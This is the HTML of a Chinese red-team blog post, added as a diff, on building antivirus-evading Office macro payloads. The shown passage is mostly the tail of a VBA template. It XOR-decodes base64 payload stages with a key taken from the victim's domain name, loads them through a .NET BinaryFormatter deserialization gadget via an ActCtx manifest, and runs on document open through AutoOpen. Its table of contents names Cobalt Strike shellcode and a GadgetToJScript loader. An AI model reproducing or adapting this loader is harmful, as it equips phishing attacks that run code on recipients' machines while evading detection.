+            <span class="keyword">If</span> l &gt; UBound(byKey) <span class="keyword">Then</span> l = LBound(byKey)
+
+        <span class="keyword">Next</span> i
+
+        XorC = byOut
+
+        <span class="keyword">If</span> bEncOrDec <span class="keyword">Then</span> XorC = <span class="string">"xxx"</span> &amp; XorC <span class="comment">'add "xxx" onto encrypted text</span>
+<span class="keyword">End</span> <span class="keyword">Function</span>
+
+
+<span class="keyword">Function</span> myKey()
+myEnv = Environ(<span class="string">"USERDNSDOMAIN"</span>)
+myEnv = Right(myEnv, <span class="number">9</span>)
+myKey = myEnv
+<span class="keyword">End</span> <span class="keyword">Function</span>
+
+<span class="keyword">Function</span> b64Decode(<span class="keyword">ByVal</span> enc)
+    <span class="keyword">Dim</span> xmlObj, nodeObj
+    <span class="keyword">Set</span> xmlObj = CreateObject(<span class="string">"Msxml2.DOMDocument.3.0"</span>)
+    <span class="keyword">Set</span> nodeObj = xmlObj.CreateElement(<span class="string">"base64"</span>)
+    nodeObj.dataType = <span class="string">"bin.base64"</span>
+    nodeObj.<span class="keyword">Text</span> = enc
+    b64Decode = nodeObj.nodeTypedValue
+    <span class="keyword">Set</span> nodeObj = <span class="literal">Nothing</span>
+    <span class="keyword">Set</span> xmlObj = <span class="literal">Nothing</span>
+<span class="keyword">End</span> <span class="keyword">Function</span>
+
+<span class="keyword">Function</span> Exec()
+
+    <span class="keyword">Dim</span> stage_1, stage_2
+
+    ${stage_xor1}
+
+
+    ${stage_xor2}
+
+    new_stage_1 = b64Decode(stage_1)
+    <span class="keyword">Key</span> = myKey
+    Unicode_new_stage_1 = StrConv(new_stage_1, vbUnicode)
+    de_stage_1 = XorC(Unicode_new_stage_1, <span class="keyword">Key</span>)
+    last_stage_1 = Replace(de_stage_1, <span class="string">"xxx"</span>, <span class="string">""</span>, <span class="number">4</span>)
+
+    new_stage_2 = b64Decode(stage_2)
+    Unicode_new_stage_2 = StrConv(new_stage_2, vbUnicode)
+    de_stage_2 = XorC(Unicode_new_stage_2, <span class="keyword">Key</span>)
+    last_stage_2 = Replace(de_stage_2, <span class="string">"xxx"</span>, <span class="string">""</span>, <span class="number">4</span>)
+
+    <span class="keyword">Dim</span> stm_1 <span class="keyword">As</span> <span class="built_in">Object</span>, fmt_1 <span class="keyword">As</span> <span class="built_in">Object</span>
+
+    manifest = <span class="string">"&lt;?xml version=""1.0"" encoding=""UTF-16"" standalone=""yes""?&gt;"</span>
+    manifest = manifest &amp; <span class="string">"&lt;assembly xmlns=""urn:schemas-microsoft-com:asm.v1"" manifestVersion=""1.0""&gt;"</span>
+    manifest = manifest &amp; <span class="string">"&lt;assemblyIdentity name=""mscorlib"" version=""4.0.0.0"" publicKeyToken=""B77A5C561934E089"" /&gt;"</span>
+    manifest = manifest &amp; <span class="string">"&lt;clrClass clsid=""{D0CBA7AF-93F5-378A-BB11-2A5D9AA9C4D7}"" progid=""System.Runtime.Serialization"</span>
+    manifest = manifest &amp; <span class="string">".Formatters.Binary.BinaryFormatter"" threadingModel=""Both"" name=""System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"" "</span>
+    manifest = manifest &amp; <span class="string">"runtimeVersion=""v4.0.30319"" /&gt;&lt;clrClass clsid=""{8D907846-455E-39A7-BD31-BC9F81468B47}"" "</span>
+    manifest = manifest &amp; <span class="string">"progid=""System.IO.MemoryStream"" threadingModel=""Both"" name=""System.IO.MemoryStream"" runtimeVersion=""v4.0.30319"" /&gt;&lt;/assembly&gt;"</span>
+
+
+    <span class="keyword">Set</span> actCtx = CreateObject(<span class="string">"Microsoft.Windows.ActCtx"</span>)
+    actCtx.ManifestText = manifest
+
+    <span class="keyword">Set</span> stm_1 = actCtx.CreateObject(<span class="string">"System.IO.MemoryStream"</span>)
+    <span class="keyword">Set</span> fmt_1 = actCtx.CreateObject(<span class="string">"System.Runtime.Serialization.Formatters.Binary.BinaryFormatter"</span>)
+
+    <span class="keyword">Dim</span> Decstage_1
+    Decstage_1 = b64Decode(last_stage_1)
+
+    <span class="keyword">For</span> <span class="keyword">Each</span> i <span class="keyword">In</span> Decstage_1
+        stm_1.WriteByte i
+    <span class="keyword">Next</span> i
+
+    <span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span>
+
+    stm_1.Position = <span class="number">0</span>
+    <span class="keyword">Dim</span> o1 <span class="keyword">As</span> <span class="built_in">Object</span>
+    <span class="keyword">Set</span> o1 = fmt_1.Deserialize_2(stm_1)
+
+    <span class="keyword">If</span> Err.Number &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span>
+       <span class="keyword">Dim</span> stm_2 <span class="keyword">As</span> <span class="built_in">Object</span>
+
+       <span class="keyword">Set</span> stm_2 = actCtx.CreateObject(<span class="string">"System.IO.MemoryStream"</span>)
+
+       <span class="keyword">Dim</span> Decstage_2
+       Decstage_2 = b64Decode(last_stage_2)
+
+       <span class="keyword">For</span> <span class="keyword">Each</span> j <span class="keyword">In</span> Decstage_2
+        stm_2.WriteByte j
+       <span class="keyword">Next</span> j
+
+       stm_2.Position = <span class="number">0</span>
+       <span class="keyword">Dim</span> o2 <span class="keyword">As</span> <span class="built_in">Object</span>
+       <span class="keyword">Set</span> o2 = fmt_1.Deserialize_2(stm_2)
+    <span class="keyword">End</span> <span class="keyword">If</span>
+
+<span class="keyword">End</span> <span class="keyword">Function</span>
+<span class="keyword">Sub</span> AutoOpen()
+exec
+<span class="keyword">End</span> <span class="keyword">Sub</span></code></pre>
+<h3 id="0x07-宏安全相关文章推荐"><a href="#0x07-宏安全相关文章推荐" class="headerlink" title="0x07 宏安全相关文章推荐:"></a>0x07 宏安全相关文章推荐:</h3><p><a href="https://github.com/TonyChen56/Virus-Analysis/tree/master/%E5%AE%8F%E7%97%85%E6%AF%92%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90" target="_blank" rel="noopener">宏病毒的研究与实例分析</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/116554010" target="_blank" rel="noopener">关于宏的bypass学习</a></p>
+<p><a href="https://zeronohacker.com/cybersecurity/security-technique/analysis-excel-4-0-marco-from-field-office-sample.html" target="_blank" rel="noopener">从一个野外 office 样本分析中学习 Excel 4.0 marco</a></p>
+<p><a href="https://zeronohacker.com/cybersecurity/tools/the-malicious-document-analysis-tool-of-oletools-instructions.html" target="_blank" rel="noopener">恶意文档分析工具 oletools 使用说明</a></p>
+
+  </div>
+</article>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/ATT-CK/">Att&amp;ck</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-cobaltstrike-生成csharp-shellcode"><span class="toc-number">1.</span> <span class="toc-text">0x01 cobaltstrike 生成csharp shellcode</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-使用shellcode加载器"><span class="toc-number">2.</span> <span class="toc-text">0x02 使用shellcode加载器:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-使用GadgetToJScript-生成vba"><span class="toc-number">3.</span> <span class="toc-text">0x03 使用GadgetToJScript 生成vba</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-对GadgetToJScript-生成的payload-stage部分进行xor处理"><span class="toc-number">4.</span> <span class="toc-text">0x04 对GadgetToJScript 生成的payload stage部分进行xor处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-模板文件"><span class="toc-number">5.</span> <span class="toc-text">0x05 模板文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-宏安全相关文章推荐"><span class="toc-number">6.</span> <span class="toc-text">0x07 宏安全相关文章推荐:</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://wolvez.club/2020/12/17/macro/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://wolvez.club/2020/12/17/macro/&text=邮件攻防--宏免杀姿势2"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://wolvez.club/2020/12/17/macro/&is_video=false&description=邮件攻防--宏免杀姿势2"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=邮件攻防--宏免杀姿势2&body=Check out this article: http://wolvez.club/2020/12/17/macro/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://wolvez.club/2020/12/17/macro/&title=邮件攻防--宏免杀姿势2"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://wolvez.club/2020/12/17/macro/&name=邮件攻防--宏免杀姿势2&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 wolvez
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/links/">Links</a></li>
+         
+          <li><a href="/ATT-CK/">Att&amp;ck</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+
+
+
+
